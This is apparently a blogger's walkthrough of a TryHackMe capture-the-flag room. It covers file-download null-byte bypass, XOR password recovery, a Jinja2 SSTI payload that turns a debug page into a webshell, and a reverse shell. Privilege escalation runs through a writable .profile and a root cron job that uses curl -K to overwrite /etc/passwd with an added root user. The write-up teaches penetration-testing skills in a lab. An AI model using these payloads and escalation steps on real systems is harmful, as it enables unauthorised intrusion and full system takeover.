# Super Secert TIp

https://tryhackme.com/room/supersecrettip

The title is not a typo, but a not-so-subtle reference to one of the techniques required for this room, SSTI :) An interesting room, a bit frustrating in parts. I missed something that would have had me solve it much quicker on the first foothold, and I needed the writeup to try and figure out the esoteric hints the author created for the final flag, but I had fun. The techniques I used to get through the room were a bit different than that used in the official writeup, so here they are in this walkthrough.

1. A scan will reveal port 7777, which is a website running python. The landing is just a brochureware site, but using FFUF or whatever dir busting tool will find two subdirectories, /cloud and /debug
2. /debug seems like an SSTI entry point but is guarded by a password, so we focus on /cloud. This allows the download of several useless files, one of which is templates.py. Brute forcing or guessing other file names, will reveal `source.py`.
3. This is the apparent source code for both /cloud and /debug, and it reveals several things: the only source file it will reveal is source.py, but you can download any .txt file one of which is the password for /debug, XORd against an unknown key:

    ```python
    ...
    password = str(open('supersecrettip.txt').readline().strip())
    ...
    @app.route("/cloud", methods=["GET", "POST"]) 
    def download():
        if request.method == "GET":
            return render_template('cloud.html')
        else:
            download = request.form['download']
            if download == 'source.py':
                return send_file('./source.py', as_attachment=True)
            if download[-4:] == '.txt':
                print('download: ' + download)
                return send_from_directory(app.root_path, download, as_attachment=True)
            else:
                return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
                # return render_template('cloud.html', msg="Network error occurred")
    ...
    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")
    ...
    ```

4. To proceed I need the XOR key, and several attempts to brute force it failed. This took me days to figure out, but the solution is simple: the download file path is vulnerable to null byte termination. That is, a path like `debugpassword.py%00.txt` will pass the .txt check and read the relevant source file, giving me the decryption key.
5. Because the 'supersecrettip.txt' file holds a python byte array, to be sure that I had it right I wrote some python to read this and print out the base64: `import base64;print(base64.standard_b64encode([file-contents]))`. I then used cyberchef with [from base64] -> [xor] to get the password for the /debug interface.

6. Reviewing the code carefully, there are two functions. The first, handling the /debug endpoint, will check the password and if correct set the 'debug' payload as a session key, returning it in the cookie. The second is the /debugresult endpoint, which will check if X-Forwarded-For is set to 127.0.0.1, and then render a Jinja2 template with the debug session value injected in. This is straight forward SSTI:

  ```python
 @app.route("/debugresult", methods=["GET"]) 
  def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")
    
    if not session:
        return render_template("debugresult.html")
    
    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')
    
    if not debug and not user_password:
        return render_template("debugresult.html")
        
    # return render_template("debugresult.html", debug=debug, success=True)
    
    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")
  ```

One key restriction is the illegal chars check, which blocks `'` among other things.

7. To implement really basic RCE, creating an effective webshell, the following payload was passed to /debug: `/debug?debug={{self.__init__.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()}}&password=[REDACTED]`
   The payload is `{{self.__init__.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()}}`, with the key parts being `request.args.a` and `request.args.b`. On /debugresult, this can now be used with ?a=os&b=id, turning this payload into `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`. This makes debug result a webshell, as just by changing the b parameter any given command can be run.

8. To get a reverse shell there were a few options. The system doesn't have netcat on it, but by checking `uname -a` I found that it should be compatible with my attack box (both ubuntu), so I just downloaded the copy of nc.openbsd from the attack box to /tmp, made it executable, then used a standard mkfifo reverse shell to get a foothold as the user `ayham` and the first flag.

9. Enumerating the machine, a second user named F30s had two files in their home directory, both readable: site_check and health_check. Additionally, their .profile was writable:

  ```bash
  -rw-r--rw- 1 F30s F30s  807 Mar 27  2022 .profile
  -rw-r--r-- 1 root root   17 May 19 08:18 health_check
  -rw-r----- 1 F30s F30s   38 May 22 13:19 site_check
  ```

  Checking the cronjobs with `cat /etc/crontab`:

  ```bash
  *  *    * * *   root    curl -K /home/F30s/site_check
  *  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
  ```

  So the path was first to hop to F30s via health_check, and then to root via site_check.

10. `bash -lc` meant that the users local profile would be loaded. The way I exploited this was simple as the .profile file is a big shell script: `echo 'cp /bin/sh ~/sh && chmod u+s ~/sh' >> .profile`. This meant that when the command was run, a SUID bit sh binary for the user F30s would be created in their home directory. Once this occured, I gained their effective permissions with `./sh -p`

11. `curl -K` loads configuration options from whatever file is specified, in this case site_check. It contained `url = "http://127.0.0.1/health_check"`. Adding outfile to this would allow me to fetch any file as root and then write it over any file on the system. To exploit this I hosted a copy of the passwd file, and added `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash`, a user named user3 with the password `pass123`. By setting url to my hosted file, and `output = "/etc/passwd"`, I was able to overwrite passwd and then switch to root with `su user123`.

12. The final flag was a bit about guessing. There are two files under /root: flag2.txt and secret.txt. Both contain byte arrays like earlier, garbled text indicating a XOR was needed. There was also a secret-tip.txt file in /, that contained some cryptic hints (e.g. 'So, I was missing 2 .. hmm .. what were they called?' and 'Don't forget it's always about root!'. The key for this was that secret.txt should be xored with 'root', with the result being a large number with two X's at the end. Via brute forcing you can resolve those two X's to the two missing numbers and get the full XOR key for the final flag.

So yeah, overall good fun. I like exploiting things like a .profile via these rarely used variations of common commands. Only thing I didn't like was the final guessing game, but maybe I just suck :)
